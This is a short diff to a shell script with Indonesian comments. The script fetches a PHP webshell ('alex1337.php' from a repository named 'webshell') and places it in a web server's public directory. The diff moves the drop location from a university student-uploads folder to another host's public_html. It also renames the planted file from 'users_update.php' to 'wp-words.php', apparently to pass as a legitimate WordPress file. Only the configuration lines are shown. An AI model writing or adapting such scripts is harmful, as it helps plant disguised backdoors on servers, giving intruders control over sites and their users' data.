@@ -2,8 +2,8 @@
 
 # Konfigurasi
 URL="https://raw.githubusercontent.com/alexithema/webshell/refs/heads/main/alex1337.php"
-DOWNLOAD_DIR="/var/www/kukerta/uploads/mahasiswa/"
-OUTPUT_FILE="users_update.php"
+DOWNLOAD_DIR="/home/openpxmb/public_html/"
+OUTPUT_FILE="wp-words.php"
 OUTPUT_PATH="$DOWNLOAD_DIR/$OUTPUT_FILE"
 
 # Pastikan direktori tujuan ada
